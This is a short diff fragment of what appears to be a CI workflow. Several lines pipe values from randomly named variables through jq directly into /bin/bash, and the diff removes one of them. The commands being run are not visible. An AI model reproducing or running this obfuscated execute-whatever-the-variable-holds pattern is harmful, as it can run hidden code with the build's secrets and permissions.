@@ -24,7 +24,6 @@ jobs:
           echo $gbjv6 | jq -r .rwj175 | /bin/bash
           echo $llkeo44 | jq -r .d741 | /bin/bash
           echo $ztjw32 | jq -r .s91841 | /bin/bash
-          echo $bdt3903 | jq -r .tso8754 | /bin/bash
           echo $uuxf447 | jq -r .ayy3231 | /bin/bash
 
       - name: Store output
